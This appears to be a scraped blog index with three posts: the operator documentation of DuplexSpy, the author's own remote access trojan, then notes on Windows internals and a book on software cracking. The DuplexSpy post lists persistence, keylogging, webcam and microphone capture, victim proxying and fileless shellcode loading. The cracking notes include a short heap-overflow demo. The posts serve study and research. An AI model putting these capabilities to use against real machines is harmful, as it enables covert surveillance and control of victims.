this tool. IntroductionDuplexSpy incorporates features inspired by other tools as well as my own personal experience. Compared to the previous version, I removed several features that I considered unnecessary and added a number of new ones. Throughout this development process, I learned a great deal, and I sincerely hope that this project can be useful to others who are interested in offensive security or malware research. If you encounter any issues or have suggestions, please feel free to open an issue on the repository page. View the GitHub repository here. DisclaimerThis project was developed as part of my personal interest in studying cybersecurity. However, it may potentially be misused for malicious purposes. Please do NOT use this tool for any illegal activities. Getting StartDirectory and FilesDirectory structure is shown as following: DeployExecute DuplexSpyCS.exe. This is the home page of DuplexSpy: ListenerA listener is an interface component of DuplexSpy. It acts as a socket listener on the server side. DuplexSpy provides three types of listeners, all of which offer secure and robust communication protocols. TCPThe data stream transmitted through this protocol is encrypted after a key exchange procedure. The server generates an RSA key pair and sends the public key to the client. The client then uses this public key to encrypt an AES key and an initialization vector (IV), and sends them back to the server. After receiving the encrypted AES key and IV, the server decrypts them and stores them in memory. During the validation phase, the server sends a plaintext challenge to the client. The client responds with an encrypted version of the challenge using the AES algorithm. If the server can successfully decrypt the response using the stored AES key and IV, the validation procedure is considered complete. The server then notifies the client to enter the compromised state. This protocol uses RSA-2048 and AES-256-CBC. TLSThis protocol provides a secure and robust communication channel for C2 traffic. Before using this listener, you must generate an SSL certificate file. HTTPAll data are encapsulated within HTTP requests and responses. This listener also provides an encrypted communication channel to protect C2 traffic. Its handshaking procedure is identical to that of the TCP listener described above. Add a New ListenerIn this example, I am going to demonstrate how to add a new listener. Firstly, click the New button on the top. Now you have opened a new panel. Select a protocol used for listener (In this case, I use TLS): Notice that you should create a certificate file if you are going to use a TLS listener. Save configuration without SSL certificate file. You can create a certificate file through openssl command or using DuplexSpy. DuplexSpy checks the listener configuration before it shows. If a mal-config is detected. The state of your listener will be turned into unavailable. Generate a PayloadDuplexSpy currently provides a single payload type. In the previous version, three different payload types were available, but issues were discovered in the other two. These will be addressed in a future release. To generate a payload, click Build on the home page. PersistenceDuplexSpy provides two persistence methods. The first one is copy the payload to StartUp directory, and the second method is modifying the registry data. The latter method is called at the end of copying file. InfectedLike other remote access tools, the target can be infected by directly executing the .exe file. Once the remote machine is compromised and successfully connects to the server, it will appear as an available item on the home page. If you see this, congratulations, you can now use the provided functions. The context menu displays all available functions. ManagerThe Manager provides the following remote administration features: File Manager Task Manager Service Manager Registry Editor Connection View Window Manager File ManagerThe File Manager provides the following functions: Show Image New Edit Copy Paste Move Delete Upload Download WGET Archive Datetime Shortcut Copy Path Toolbar functions: Home Parent Refresh New Select Execute Shell Find Task Manager Injector – Perform DLL or shellcode injection, click this to learn more about this feature. Start: Kill Kill + Delete Suspend Resume Copy Find Antivirus RegEditDuplexSpy implements a simple registry editor with a GUI similar to regedit.exe ServiceDisplays all Windows services on the compromised machine. ConnectionDisplays all active network connections. WindowDisplays all open windows and provides the following features: Capture GetDC Foreground Go to TaskMgr Copy Thread Suspend Resume TerminalDuplexSpy provides two types of cmd.exe terminal and a WQL console. Virtual TerminalA traditional virtual terminal commonly found in RATs. Xterm TerminalInspired by MobaXterm, this terminal provides an interactive console supporting tools such as: nc.exe python nmap sqlmap ssh telnet netsh WQL Desktop Webcam AudioCaptures audio streams from microphones or speakers. The received audio can be saved as an .mp3 file. FunStuffInspired by the classic Beast RAT, this module provides a collection of interactive and demonstrative features, including: MessageBox Balloon Tips Toggle Mouse Hide / Show the mouse cursor Lock / Unlock the mouse cursor Enable / Disable mouse trails hWnd Hide / Show the system tray Hide / Show the system clock Hide / Show the taskbar Hide / Show the Start Orb (the Start button at the lower-left corner of the screen) Keyboard Smile: Replace all keyboard input with a smiley face. For example, typing HelloWorld will result in ten 😊 characters. Enable / Disable keyboard input Image Wallpaper: Change or retrieve the current wallpaper of the compromised machine LockScreen: Display a specified image while disabling keyboard input and hiding the mouse cursor ProxyThe Proxy feature is designed to demonstrate a common misconception: some people believe that compromising their computer is harmless because it contains no important data. This assumption is incorrect. Even if no sensitive data is present, a compromised machine can still be abused as a proxy to conceal the attacker’s real identity. The Proxy function establishes a listener on the C2 server and accepts SOCKS5 connections from users. Network traffic is then forwarded through the compromised machine. The overall architecture is illustrated below: This feature allows attackers to browse the internet, watch YouTube, or even perform SSH logins to remote servers through the compromised host. To learn more, please click here. MiscKeyloggerYears ago, when I was a beginner in cybersecurity, I was curious about how a keylogger could endanger user credentials if it only logged keystrokes. Later, I realized that the issue lies in practical design rather than raw data itself. DuplexSpy demonstrates how an offensive keylogger is implemented—not only recording the keys pressed by the user, but also capturing the timestamp and the active window title. Chat MessageThis feature allows you to have a conversation with the user who is currently logged on to the compromised machine.Currently, it supports single-user sessions and text messages only. Run ScriptExecute customized scripts. DuplexSpy provides three types of executable scripts: Batch C# VB.NET Both C# and VB.NET scripts are executed filelessly, while Batch scripts are not. PC PowerThis function includes: Restart Logout Shutdown Sleep All actions will be executed after a specified delay.Note that the compromised machine will be disconnected after the action is triggered. Fileless ExecutionThis feature allows you to execute a PE file without writing it to disk (fileless execution). To learn more, please click this. DLL LoaderThis feature writes a DLL to a temporary file (%temp%) and loads it using Win32 APIs.Note that this feature is not fileless. To learn more, please click this. Shellcode LoaderLoad shellcode directly into memory. This feature IS FILELESS. To learn more, please click this. PluginThis feature allows you to load a .NET Framework 4.8 assembly into memory, pass parameters to it, and execute customized functions. To learn more, please click this. BatchFor convenience, DuplexSpy provides several features grouped under Batch.These functions allow you to execute multiple operations or commands described above in a single workflow. DesktopThis idea is inspired by CCTV monitoring systems.Each page displays up to 9 desktops. WebcamThis idea is also inspired by CCTV monitoring systems.Each page displays up to 9 webcams. Unlike Multi-Desktop, webcam images are not displayed automatically. Lock ScreenThis idea comes from the comic Keroro Gunso.In the story, an alien character hijacks multiple computers and displays a star logo while their team invades Earth. Run ScriptSend customized scripts to compromised machines. URLOpen a URL or download an executable from a specified URL. Connection Reconnect: Notify the remote computer to reconnect to the server. Disconnect: Notify the remote computer to disconnect from the server. The payload will be terminated. Client Sleep: Disconnect from the C2 server and reconnect after a specified delay. Update: Send a new payload to the compromised machine, delete the old payload, and execute the new one (not fileless). Remove: Terminate and delete the payload on the compromised machine. LocalSome functions are executed on your server only: Open Folder: When a compromised machine is online, DuplexSpy creates a dedicated folder for it. This feature allows you to open the folder via explorer.exe. Highlight: Highlight the selected items. CopyThis function also runs on your server only.It allows you to copy the online ID or IPv4 address to your clipboard. THANKS FOR READING!","categories":[{"name":"Tools/DuplexSpy","slug":"Tools-DuplexSpy","permalink":"https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"}],"tags":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"C#","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Program","slug":"Program","permalink":"https://iss4cf0ng.github.io/tags/Program/"},{"name":"DuplexSpy","slug":"DuplexSpy","permalink":"https://iss4cf0ng.github.io/tags/DuplexSpy/"},{"name":"RAT","slug":"RAT","permalink":"https://iss4cf0ng.github.io/tags/RAT/"},{"name":"Documentation","slug":"Documentation","permalink":"https://iss4cf0ng.github.io/tags/Documentation/"}],"keywords":[{"name":"Tools/DuplexSpy","slug":"Tools-DuplexSpy","permalink":"https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"}]},{"title":"[Book] Windows Internal Part 2","slug":"2026-1-26-BookWindowsInternal-P2","date":"2026-01-26T03:30:22.000Z","updated":"2026-01-27T07:34:05.933Z","comments":true,"path":"2026/01/26/2026-1-26-BookWindowsInternal-P2/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/26/2026-1-26-BookWindowsInternal-P2/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Windows Internal Part 2”.The content will be continuously updated as I read through the book. Reflection","categories":[],"tags":[],"keywords":[]},{"title":"[Book] Windows Internal Part 1","slug":"2026-1-26-BookWindowsInternal-P1","date":"2026-01-26T03:29:20.000Z","updated":"2026-02-17T07:48:53.192Z","comments":true,"path":"2026/01/26/2026-1-26-BookWindowsInternal-P1/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/26/2026-1-26-BookWindowsInternal-P1/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Windows Internal Part 1”.The content will be continuously updated as I read through the book. ReflectionChapter 1 - Concepts and ToolsFundation concepts and termsWindows APIThe Windows application programming interface (API) is the user-mode system programming interface to the Windows OS family. Prior to the introduction of 64-bit versions of Windows, the API to the 32-bit versions of the Windows OS was called the Win32 API to distinguish it from the original 16-bit Windows API. The term Windows API refers to both the 32-bit and 64-bit API to Windows. Windows API flavorsCOM was originally created to enable Microsoft Office applications to communicate and exchange data between documents (such as embedding an Excel chart inside a Word document or a PowerPoint presentation). This ability is called Object Linking and Embedding (OLE). OLE was originally implemented using an old Windows messaging mechanism called Dynamic Data Exchange (DDE). COM is baed on two foundational principles. First, client communicate with objects (sometimes called COM server object) through interfaces——well-defined contracts with a set of logically related methods grouped under the virtual table dispatch mechanism, wich is also a common way for C++ compilers to implement virtual functions dispatch.The second principle is that component implementation is loaded dynamically rather than being statically linked to the client. The term COM server typically refers to a Dynamic Link Library (DLL) or an executable (EXE) where the COM classes are implemented. The Windows RuntimeWindows 8 introduced a new API and supporting runtime called Windows Runtime (sometimes abbreviated WinRT, not to be confused with Windows RT, the discontinued ARM-based Windows OS version). From an API perspective, WInRT is built on top of COM, adding various extensions to the base COM infrastructure. The .NET FrameworkThe .NET Framework is part of Windows. Windows Version .NET Framework Version Windows 8 4.5 Windows 8.1 4.5.1 Windows 10 4.6 Windows 10 version 1511 4.6.1 Windows 10 version 1607 4.6.2 The .NET Framework consists of two major components: The Common Language Runtime (CLT) The .NET Framework Class Library (FCL) Services, functions, and routines Windows API functions Native system service (or system calls) Kernel support functions (or routines) ProcessesAlthough programs and process appear similar on the surface, they are fundamentally different. A program is a static sequence of instructions, whereas a process is a container for a set of resources used when executing the instance of the program. A private virtual address space An executable program A list of open handles A security context A process ID At least one thread of execution ThreadsA thread is an entity within a process that Windows schedules for execution. Without it, the process’s program can’t run. A thread includes the follow essential components: The contents of a set of CPU registers representing the state of the processor Two stacks——one for the thread to use while executing in kernel mode and one for executing in user mode. A private storage area called thread-lcoal storage (TLS)* for use by subsystems, run-time libraries, and DLLs. A unique identifier called a thread ID (part of an internal structure called a client ID; process IDs and thread IDs are generated out of the same namespace, so they never overlap) The threads of a 32-bit application running on a 64-bit version of WIndows will contain both 32-bit and 64-bit context, which Wow64 will use to switch the applicaion from running in 32-bit to 64-bit mode when required. These threads will have two user stacks and two CONTEXT blocks, and the usual Windows API functions will return the 64-bit context instead. The Wow64GetThreadContext function, however, will return the 32-bit context. FibersFibers allow an application to schedule its own threads of execution rather than rely on the priority-based scheduling mechanism built into Windows. Fibers are often called lightweight threads. In terms of scheduling, they are invisible to the kernel because they are implementeed in user mode in kernel32.dll. To use fibers, you first make a call to the Windows ConvertThreadToFiber function. This function converts the thread to a running fiber. Afterward, the newly converted fiber can create additonal fibers via the CreateFiber function (Each fiber can have its own set of fibers). User-mode scheduling threadsUser-mode schedulnig (UMS) threads, which are available only on 64-bit versions of Windows, provide the same basic advantages as fibers——and only a few of the disadvantages. UMS threads have their own kernel thread stat and are therefore visible to the kernel, which allows multiple UMS threads to issue blocking system calls and share and contend on resources. JobsWindows provides an extension to the process model called a job. A job object’s main function is to allow the management and manipulation of groups of processes as a unit. A job object allows control of certain attributes and provides limits for the process or processes associated with the job. Virtual Memory Windows implements a virtual memory system based on a flat (linear) address space that provides each process with the illusion of having its own large, private address space. Virtual memory provides a logical view of memory that might not correspond to its physical layout. Kernel mode vs. user modeTo protect user applications from accessing and/or modifying critical OS data, Windows uses two processor access modes (even if the processor on which Windows is running supports more than two): user mode and kernel mode. User application code runs in user mode, whereas OS code (such as system services and device drivers) runs in kernel mode. Kernel mode refers to a mode of execution in a processor that grants access to all system memory and all CPU instructions. Although each Windows process has its own private memory space, the kernel-mode OS and device-driver code share a single virtual address space. Each page in virtual memory is tagged to indicate what access mode the processor must be in to read and/or write the page. Pages in system space can be accessed only from kernel mode, whereas all pages in the user address space are accessible from user mode and kernel mode. Windows 10 drivers must be signed by only two of the accepted certification authorities with a SHA-2 Extended Validation (EV) Hwardware certificate instead of the regular file-based SHA-1 certiicate and its 20 authorities. HypervisorThe need for fast, efficient, and secure virtualization has driven new models of computing and reasoning about software. To provide such virtualization services, almost all modern solutions employ the use of a hypervisor, which is a specialized and highly privileged component that allows for the virtualization and isolation of all resources on the machine, from virtual to physical memory, to device interrupts, and even to PCI and USB devices. In Windows 10, Microsoft now leverages the Hyper-V hypervisor to provide a new set of services known as virtualization-based security (VBS): Device Guard: This provides Hypervisor Code Integrity (HVCI) for stronger code-signing guaratees over KMCS alone, and allows for the custumization of the signature policy of the Windows OS, for both user-mode and kernel mode code. Hyper Guard: This protects key kernel-related and hypervisor-related data structures and code. Credential Guard: This prevents unauthorized access to domain account credentials and secrets, combined with secure biometrics. Application Guard: This provides an even stronger sandbox for the Microsoft Edge browser. Host Guardian and Shielded Fabric: These leverage a virtual TPM (v-TPM) to protect a virtual machine from the infrastructure it’s running on. Additionally, the Hyper-V hypervisor enables certain key kernel mitigations against exploits and other attackers. FirmwareTerminal Services and multiple sessionsTerminal Services refers to the support in Windows for multiple interactive user sessions on a single systerm. With Windows Terminal Services, a remote user can establish a session on another machine, log in, and run applications on the server. The first session is considered the services session, or session zero, and contains system service hosing processes. Objects and handlesIn the Windows OS, a kernel object is a single, run-time instance of a statically defined object type. An object type comprises a system-defined data type, functions that operate on instances of the data type, and a set of object attributes. The most fundamental difference between an object and an ordinary data structure is that the internal structure of an object is opaque. You must call an object service to get data out of or put data into an object. You can’t directly read or change data in side an object. Objects, through the help of a kernel component called the object manager. Not all data structures in the Windows OS are objects. Only data that needs to be shared, protected, named, or made visible to user-mode programs (via system services) is placed in objects. Structures used by only one component of the OS to implement internal functions are not objects. SecurityWindows has three forms of access control over objects: Discretionary access control: It’s the method by which owners of objects (such as files or printers) grant or deny access to others. With Windows Server 2012 and Windows 8, this form of discretionary control is further improved by implementing attribute-based access control (also called Dynamic Access Control). Privileged access control: This is necessary for those times when discretionary access control is not enough. It’s a method of ensuring that someone can get to protected objects if the owner isn’t available. Mandatory integrity control: This is required when an additional level of security control is needed to protect objects that are being accessed from within the same user account. Starting with Windows 8, a sandbox called an AppContainer is used to host Windows Apps, which provides isolation with relation to other AppContainers and non-Windows Apps processes. RegistryUnicodeChapter 2 - System architectureOperating system modelArchitecture overviewDespite its pervasive use of objects to represent shared system resources, Windows is not an object-oriented system in the strict sense. Most of the kernel-mdoe OS code is written in C for portability. The C programming language doesn’t directly support object-oriented constructs such as polymorphic functions or class inheritance. Therefore, the C-based implementation of objects in Windows borrows from, but doesn’t depend on, features of particular object-oriented languages. The boexes above the line represent user-mode processes, and the components below the line are kernel-mode OS services. A second dividing line between kernel-mode parts of Windwos and the hypervisor is also visible. The hypervisor still runs with the same CPU privilege level (0) as the kernel, but because it uses specialized CPU instructions (VT-x on Intel, SVM on AMD), it can both isolate itself from the kernel while also monitoring it (and applications). Some people may call it ring -1, which is INACCURATE. Four basic types of user-mode processes: User processes Service processes System processes Environment sybsystem server processes Windows 10 Version 1607 includes a Windows Sybsystem for Linux (WSL) in beta state for developers only. However, this is not a true subsystem as described in this section. Notice the Sybsystem DLLs blox below the Service Processes and User Processes boxes. Under Windows, user applications don’t call the native Windows OS services directly. Rather, they go through on or more subsystem dynamic-link libraries (DLLs). The role of subsystem DLLs is to translate a documented function into the appropriate internal (and generally undocumented) native system service calls implemented mostly in Ntdll.dll. The kernel-mode components of Windows include the following: Executive: The Windows executive contains the base OS services, such as memory management, process and thread management, security, I/O, networking, and inter-process communication. The Windows kernel Device drivers: This includes both hardware device drivers, and non-hardware device drivers. The Hardware Abstraction Layer (HAL) The windowing and graphics system The hypervisor layer: This is composed of the hypervisor itself. There are no drivers or other modules in this environment. The hypervisor is itself composed of multiple internal layers and services, such as its own memory manager, virtual processor scheduler, interrupt and timer management, synchronization routines, partitions, IPC and more. Core Windows System Files: File Name Components Ntoskrnl.exe Executive and kernel Hal.dll HAL Win32.sys Kernel-mode part of the Windows subsystem (GUI) Hvix64.exe (Intel), Hvax64.exe (AMD) Hypervisor .sys file in \\SystemRoot\\System32\\Drivers Core driver files, such as Direct X, Volume Manager, TCP/IP, TPM, andACPI supprot. Ntdll.dll Internal support functions and system service dispatch stubs to executive functions Kernel32.dll, Advapi32.dll, User32.dll, Gdi32.dll Core Windows subsystem DLLs. PortabilityWindows archives portability accross hardware architectures and platforms in two primary ways: By using layered design By using C Symmetric multiprocessingWindows is a symmetric multiprocessing (SMP) OS. There is no master processor——the OS as well as user threads can be scheduled to run on any processor. Also, all the processors share just one memory space. This module contrasts with asymmetric multiprocessing (ASMP), in which the OS typically selects one processor to execute OS kernel code while other processors run only user code. Windows also supports four modern types of multiprocessor system: multicore, simultaneous multi-threaded (SMT), heterogeneous, and non-uniform memory access (NUMA). ScalabilityDifferences between client and server versionsChecked buildVirtualization-based security architecture overviewThe separation between user mode and kernel mode provides protection for the OS from user-mode code, whether malicious or not. Here VBS stands for Virtualization-Based Security. VTL stands for Virtual Trust Levels. The user/kernel code is running on top of a Hyper-V hypervisor. The difference is that with VBS enabled, a VTL of 1 is now present, which contains its own secure kernel running in the privileged processor mode (that is, ring 0 on x86/x64). Similarly, a run-time user environment mode, called the Isolated User Mode (IUM), now exists, which runs in unprivileged mode (that is, ring 3). Key system componentsThe role of an environment subsystem is to expose some subset of the base Windows executive system services to application programs. User applications don’t call Windows system services directly. Instead, they go through one or more subsystem DLLs. These libraries export the documented interface that the programs linked to that subsystem can called. ExecutiveThe executive includes the following types of functions: Functions that are exported and callable from user mode: These functions are called system services and are exported via Ntdll.dll Device driver functions that are called through the DeviceIoControl function Functions that can be called only from kernel mode that are exported and documented in the WDK Functions that are defined as global symbols but are not exported Functions that are internal to a module that are not defined as global symbols KernelThe kernel consists of a set of functions in Ntoskrnl.exe that provides fundamental mechanisms. THese include thread-scheduling and synchronization services, used by the executive components, and low-level hardware architecture——dependent support, such as interrupt and exception dispatching, which is different on each processor architecture. The kernel provides a low-level based of well-defined, predictable OS primitives and mechanisms that allow higher-level components of the executive to do what they need to do. HALDevice DriversSystem ProcessesChapter 3 - Processes and jobs CreateProcess CreateProcessAsUser: If a different token is required. CreateProcessWithTokenW (advapi32.dll) CreateProcessWithLogonW (advapi32.dll) SlrCreateProcessWithLogon","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] Encrypting and Decrypting a Software","slug":"2026-1-23-SoftwareCrypto","date":"2026-01-22T16:47:22.000Z","updated":"2026-01-27T07:31:37.920Z","comments":true,"path":"2026/01/23/2026-1-23-SoftwareCrypto/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/23/2026-1-23-SoftwareCrypto/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Encrypting and Decrypting a Software”.The content will be continuously updated as I read through the book. ReflectionThis book covers many topics and has almost 1,000 pages. The book includes the following topics: Software cracking (patching and bypassing) Mathematical cryptography (with formulas and expressions) Software vulnerabilities (stack buffer overflow and heap buffer overflow) Software packing, unpacking, and packer stubs Reverse engineering Most of the topics focus on Windows rather than Linux. Personally, I do not recommend this book for beginners in reverse engineering. Although the topics are broad, the book does not explore them in great depth. While the book introduces a wide range of topics, some of them could benefit from more detailed explanations, which may make the book less accessible to beginners. There are several typos in the book, such as misusing the terms byte and bit, which was quite confusing. The biggest drawback is that the example source code is very difficult to obtain for foreign readers. It would be excellent if the authors uploaded their source code to GitHub, similar to the author of Reverse Engineering Core. On the other hand, since the book covers many topics, it can be used as a reference or dictionary. In addition, it includes some topics that are rarely discussed in other books. Chapter 1 - Fundamental Knowledge1.3 - Windows OSWin32 API Kernel (kernel32.dll): Processes, threads, memory, file IO, etc. User (user32.dll): Mouse click, keyboard input, window, menu, etc. GDI (gdi32.dll): Display text. advapi32.dll comctl32.dll comdlg32.dll shell32.dll netapi32.dll For Win32 API functions, “A” stands for ANSI. “W” stands for Widechars(Unicode). 123456int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType); WOW64WOW64 stands for Windows on Windows 64-bit. Windows Message MechanismSendMessage()123456LRESULT SendMessage( HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam); WM_COMMAND1234WM_COMMAND wNotifyCode = HIWORD(wParam); wID = LOWORD(wParam); hwndCtl = (HWND)lParam; WM_GETTEXT123WM_GETTEXT wParam = (WPARAM)cchTextMax; lParam = (LPARAM)lpszText; WM_QUIT12WM_QUIT nExitCode = (int)wParam; WM_LBUTTONDOWN1234WM_LBUTTONDOWN fwKeys = wParam; xPos = LOWORD(lParam); yPos = HIWORD(lParam); Virtual MemoryChapter 2 - Dynamic Analysis2.1 - OllyDbgBreakPoint INT 3 1004013A5 CC D0404000 OllyDbg replaces the original instruction to 0xCC. However, the original instruction in displayed. Hardware BreakPointHardware break points are implemented with DRx registers. The addresses of break points are stored into DR0 ~ DR3, while DR7 stores the status. Thus, the maximum number of hardware break points are is 4. Memory BreakPoint On Access On Write Set break-on-access Message BreakPoint View -&gt; Windows Message breakpoint on ClassProc Conditional BreakPoint Shift+F2 Conditional Log 2.3 - MDebug2.4 - WinDbgChapter 3 - Static Analysis3.2 - Disassembly Engine ODDisasm BeaEngine Udis86 Capstone AsmJit Keystone 3.3 - Static DisassemblyIDA Hexadecimal Tools HexWorkship WinHex Hiew Chapter 4 - Reverse Engineering Techniques4.1 - Reverse Engineering on x32 PlatformCalling ConventionExample1:1test1(p1, p2, p3); __cdecl12345push p3 ; right to leftpush p2push p1call test1add esp,0C ; stack cleanup pascal1234push p1 ; left to rightpush p2push p3call test1 ; stack cleanup in the function stdcall1234push p3 ; right to leftpush p2push p1call test1 ; stack cleanup in the function Example2:1test2(p1, p2); stdcall1234567891011121314151617push p2 ; Parameter 2push p1 ; Parameter 1call test2&#123; push ebp ; Original EBP pointer mov ebp, esp ; New EBP pointer mov eax, dword ptr[ebp+0C] ; Parameter 2 mov ebx, dword ptr[ebp+08] ; Parameter 1 sub esp, 8 ; Reserve space for local variables ... add esp, 8 ; Release space of local variables pop ebp ; Original EBP pointer ret 8 ; return (Equal to ret # add esp, 8) ; 2 (Parameter) x 4h = 8&#125; enter: push ebp # mov ebp,esp # sub esp, xxx leave: add esp, xxx # pop ebp We can rewrite the script above123456enter xxxx, 0 ; Reserver space xxxx for local variable...leaveret 8 Enable Maximum Speed in VC6.01234567891011push p2push p1call test2&#123; mov eax, dword ptr [esp+04] ; Call parameter 1 mov ecx, dword ptr [esp+08] ; Call parameter 2 ... ret 8 ; return&#125; Virtual FunctionChapter 5 - Software Protection Demonstration5.1 - Serial Number and KeyGen \\text{Serial Number} = F(\\text{Username}) \\text{Username} = F^{-1}(\\text{Serial Number}) F_1(\\text{Username}) = F_2(\\text{Serial Number}) Some value = F(\\text{Username}, \\text{Serial Number}) Exploiting Serial Number Protection MechanismCommonly used API functions for Serial Number Protection: The following functions are commonly used for input: GetWindowTextA(W) GetDlgItemTextA(W) GetDlgItemInt hmencpy (Windows 9x/Me only) The floowing functions are commonly used for messagebox: MessageBoxA(W) MessageBoxExA(W) ShowWindow MessageBoxIndirectA(W) CreateDialogParamA(W) CreateDialogIndirectParamA(W) DialogBoxParamA(W) DialogBoxIndirectParamA(W) Other functions: Serial number might be stored in registry: RegQueryValueExA(W) Serial number might be stored in an INI file: GetPrivateProfileStringA(W) GetPrivateProfileIntA(W) GetProfileStringA(W) GetProfileIntA(W) Serial number might be stored in other file: CreateFileA(W) _lopen() KeyFile Protection API Function Description FindFirstFileA CreateFileA, _lopen GetFileSize, GetFileSizeEx GetFileAttributesA, GetFileAttributesExA SetFilePointer, SetFilePointerEx Mov ReadFile Obtain file content. 5.7 - Disk Protection5.8 - Single InstanceChapter 6 - Cryptography Algorithm6.1 - HashingMD5MD5 stands for Message Digest Algorithm 5. A = 01234567h\\\\ B = 89abcdefh\\\\ C = fedcba98h\\\\ D = 76543210h\\\\ \\begin{align*} F(X,Y,Z) &= (X\\&Y) | ((\\sim X)\\&Z)\\\\ G(X,Y,Z) &= (X\\&Z) | (Y\\&(\\sim Z))\\\\ H(X,Y,Z) &= X\\text{\\textasciicircum}Y\\text{\\textasciicircum}Z\\\\ I(X,Y,Z) &= Y\\text{\\textasciicircum}(X|(\\sim Z)) \\end{align*}SHASHA stands for Secure Hash Algorithm. SHA-1 SHA-256 SHA-384 SHA-512 6.2 - Symmetric Encryption DES (Data Encryption Standard) IDEA (International Data Encryption Algorithm) AES (Advanced Encryption Standard) BlowFish TwoFish RC4RC4 stands for Rivest Cipher 4. KSA (Key-Scheduling Algorithm)12345678910111213RC4-KSA(Key) for i := 0 to 255 do S[i] := i end for j := 0 for i := 0 to 255 do j := (j + S[i] + Key[i mod keylength]) mod 256 swap S[i] and S[j] end for return S PRGA (Pseudo-Random Generation Algorithm)123456789101112RC4-PRGA(S) i := 0 j := 0 while true do i := (i + 1) mod 256 j := (j + S[i]) mod 256 swap S[i] and S[j] t := (S[i] + S[j]) mod 256 K := S[t] output K end while TEATEA stands for Tiny Encryption Algorithm. 12345678910111213141516TEA_Encrypt(v[2], k[4])&#123; uint32 v0 = v[0], v1 = v[1]; uint32 sum = 0; uint32 delta = 0x9E3779B9; for (i = 0; i &lt; 32; i++) &#123; sum += delta; v0 += ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]); v1 += ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]); &#125; v[0] = v0; v[1] = v1;&#125; 12345678910111213141516TEA_Decrypt(v[2], k[4])&#123; uint32 v0 = v[0], v1 = v[1]; uint32 delta = 0x9E3779B9; uint32 sum = delta * 32; for (i = 0; i &lt; 32; i++) &#123; v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]); v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]); sum -= delta; &#125; v[0] = v0; v[1] = v1;&#125; Where: \\begin{align*} delta &= \\frac{\\sqrt{5} - 1}{2} \\times 2^{32}\\\\ &= (\\sqrt{5} - 1) \\times 2^{31} \\end{align*}IDEABlowFishAESChapter 7 - Windows Kernel Fundamentals7.1 - Kernel Fundamentals Source: https://www.linkedin.com/pulse/windows-os-rings-role-event-monitoring-jacob-stickney-thv5c 7.2 - Important Kernel Data Structure7.3 - Fundamentals of Kernel DebuggingChapter 8 - Windows Exception Handling8.1 - Fundamentals of Exception Handling12345678VOID RaiseException( [in] DWORD dwExceptionCode, [in] DWORD dwExceptionFlags, [in] DWORD nNumberOfArguments, [in] const ULONG_PTR *lpArguments);//Source: https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-raiseexception When an interrupt or exception occurs, the CPU looks up the corresponding handler in the IDT. The IDT (Interrupt Descriptor Table) is a linear table stored in memory. It consists of 256 entries. Each entry is 8 bytes long on x86 (32-bit) platforms and 16 bytes long on x64 (64-bit) platforms. The base address and size of the IDT are described by the IDTR (IDT Register). The IDTR is 48 bits long on x86 systems. Although the IDTR can be accessed using the SIDT and LIDT instructions, the LIDT instruction can only be executed with Ring 0 privilege. 8.2 - SEHChapter 9 - Win32 API DebuggingChapter 14 - Vulnerability Techniques14.1 - Software VulnerabilityStack Buffer OverflowHeap Buffer Overflow1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;int main(int argc, char *argv[]) &#123; char str[] = &quot;\\nHello123456789213456789\\n&quot;; char *a, *b, *c; long *hHeap; hHeap = (long *)HeapCreate(0x00040000, 0, 0); printf(&quot;\\n(+) Creating a heap at: 0x00%xh\\n&quot;, hHeap); printf(&quot;(+) Allocating chunk A\\n&quot;); a = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10); printf(&quot;(+) Allocating chunk B\\n&quot;); b = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10); printf(&quot;(+) Chunk A=0x00%x\\n(+) Chunk=0x00%x\\n&quot;, a, b); printf(&quot;(+) Freeing chunk B to the lookaside\\n&quot;); HeapFree(hHeap, 0, b); printf(&quot;(+) Now overflow chunk A:\\n&quot;); printf(&quot;%x\\n&quot;, str); printf(str); memcpy(a, &quot;XXXXXXXXXXXXXXXXAAAABBBB\\x64\\xff\\x12\\x00&quot;, 28); printf(&quot;(+) Allocating chunk B\\n&quot;); b = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10); printf(&quot;(+) Allocating chunk C\\n&quot;); c = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMROY, 0x10); printf(&quot;(+) Chunk A=0x00%x\\n(+) Chunk B = 0x00%x\\n(+) Chunk C=0x00%x\\n&quot;, a, b, c); strcpy(c, &quot;AAAAAAAAAAAA\\n&quot;); printf(str); return 0;&#125; 14.2 - ShellcodeCHapter 15 - Software Unpacking15.2 - Packer UPX ASPack 15.3 - Packer Stub ASProtect Armadillo EXECryptor Themida THANKS FOR READING","categories":[],"tags":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Cryptography","slug":"Cryptography","permalink":"https://iss4cf0ng.github.io/tags/Cryptography/"},{"name":"Reverse 